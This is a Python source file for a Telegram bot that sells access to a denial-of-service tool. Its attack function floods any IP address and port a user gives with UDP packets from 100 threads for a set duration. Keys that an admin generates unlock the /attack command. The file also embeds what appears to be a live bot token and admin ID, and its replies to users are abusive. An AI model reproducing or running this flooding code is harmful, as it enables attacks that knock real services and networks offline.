import telebot
import socket
import threading
import time
import uuid
from datetime import datetime, timedelta

# --- CONFIG ---
TOKEN = '8662314100:AAFtujdEZNZvv5aSLyfIznvyQe1Klnl7DVk'
ADMIN_ID = 6075779781 
CONTACT_LINK = "@FLEXOP01" 
bot = telebot.TeleBot(TOKEN)

# --- DATABASE ---
keys = {} 
users = {} 

# --- ATTACK ENGINE (Countdown logic ke saath) ---
def attack_engine(ip, port, duration, chat_id, message_id):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = b"\x00" * 1200
    end_time = time.time() + duration
    
    def flood():
        while time.time() < end_time:
            try: client.sendto(bytes_data, (ip, port))
            except: break
        client.close()

    for _ in range(100):
        threading.Thread(target=flood, daemon=True).start()

    # --- ULTI GINTI (COUNTDOWN) LOGIC ---
    while time.time() < end_time:
        remaining = int(end_time - time.time())
        try:
            # Ye message har 4 second mein badlega (Ulti Ginti)
            bot.edit_message_text(
                chat_id=chat_id, 
                message_id=message_id,
                text=f"🚀 **ATTACK SHURU BHIKARI!**\n\n🎯 **Target:** `{ip}:{port}`\n⏳ **Time Left:** `{remaining}s`"
            )
        except: pass
        time.sleep(4)

    try:
        bot.edit_message_text(
            chat_id=chat_id, 
            message_id=message_id, 
            text=f"✅ **ATTACK KHATAM!**\n\n🎯 **Target:** `{ip}:{port}`\n\nChal ab nikal yahan se. Support: {CONTACT_LINK}"
        )
    except: pass

# --- KEY SYSTEM ---

@bot.message_handler(commands=['genkey'])
def generate_key(m):
    if m.from_user.id != ADMIN_ID:
        bot.reply_to(m, f"Oye! Chori karega? Pehle papa se puch le {CONTACT_LINK}")
        return
    args = m.text.split()
    if len(args) == 2:
        days = int(args[1])
        key = "VIP-" + str(uuid.uuid4())[:8].upper()
        expiry_time = datetime.now() + timedelta(days=days)
        keys[key] = expiry_time
        bot.reply_to(m, f"🔑 **Nayi Key Taiyar!**\n\nKey: `{key}`\nDays: {days}\n\nSupport: {CONTACT_LINK}")
    else:
        bot.reply_to(m, "Usage: `/genkey 7`")

@bot.message_handler(commands=['redeem'])
def redeem_key(m):
    args = m.text.split()
    if len(args) == 2:
        user_key = args[1]
        if user_key in keys:
            expiry = keys.pop(user_key)
            users[m.from_user.id] = expiry
            bot.reply_to(m, f"🎁 **VIP Access mil gaya!**\n📅 Expiry: {expiry}")
        else:
            bot.reply_to(m, f"Galat key hai! Pehle papa se puch le {CONTACT_LINK}")
    else:
        bot.reply_to(m, "Usage: `/redeem <key>`")

# --- ATTACK HANDLER ---

@bot.message_handler(commands=['attack'])
def handle_attack(m):
    if m.from_user.id not in users and m.from_user.id != ADMIN_ID:
        bot.reply_to(m, f"🚨 **Access Denied!**\nPehle key redeem kar bhikari. Papa se mang: {CONTACT_LINK}")
        return
    try:
        args = m.text.split()
        if len(args) == 4:
            ip, port, dur = args[1], int(args[2]), int(args[3])
            sent = bot.reply_to(m, "🚀 **Ruk, Attack bhej raha hoon...**")
            # Countdown wala function start hoga
            threading.Thread(target=attack_engine, args=(ip, port, dur, m.chat.id, sent.message_id)).start()
        else:
            bot.reply_to(m, f"Sahi format dal gareeb! \nExample: `/attack 1.1.1.1 80 60` \nHelp: {CONTACT_LINK}")
    except: pass

@bot.message_handler(commands=['start'])
def start(m):
    bot.reply_to(m, f"Aa gaya bhik mangne {m.from_user.first_name}? 🙄\n\nKey hai toh `/redeem` kar varna {CONTACT_LINK} par ro.")

@bot.message_handler(func=lambda m: True)
def trash(m):
    bot.reply_to(m, f"Oye! Faltu bakwas mat kar. Pehle papa se puch le {CONTACT_LINK}")

if __name__ == "__main__":
    bot.infinity_polling()
          
